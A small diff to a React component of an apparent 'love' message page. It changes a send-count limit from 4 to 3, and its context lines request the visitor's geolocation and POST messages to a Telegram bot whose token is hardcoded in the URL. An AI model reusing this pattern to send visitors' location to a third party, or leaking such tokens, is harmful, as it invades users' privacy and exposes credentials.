@@ -57,14 +57,14 @@ const App = () => {
       if (checked) return;
       setChecked(true);
       console.log("count love send: ", countLove)
-      if (countLove > 4) return;
+      if (countLove > 3) return;
       navigator.geolocation.getCurrentPosition(showPosition);
     }
     console.log("send common message")
     if (checked) return;
     setChecked(true);
     if (sendLove) return;
-    if (countLove > 4) return;
+    if (countLove > 3) return;
     fetch("https://api.telegram.org/bot6199852049:AAFYRoMbBEQBuZrx7gkaGfSnlDZxGKhMHVE/sendMessage", {
       method: "POST",
       body: JSON.stringify({
